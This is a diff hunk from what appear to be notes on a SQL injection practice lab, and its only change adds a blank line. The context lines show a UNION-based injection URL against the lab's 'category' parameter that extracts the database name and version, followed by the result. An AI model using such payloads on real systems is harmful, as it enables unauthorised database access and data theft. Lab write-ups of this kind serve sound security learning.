@@ -60,6 +60,7 @@ http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?ca
 *another appraoch*
 
 *getting database name first*
+
 http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT database(),version(),NULL,NULL --+ 
 
 database-->SQL_Injection_V4
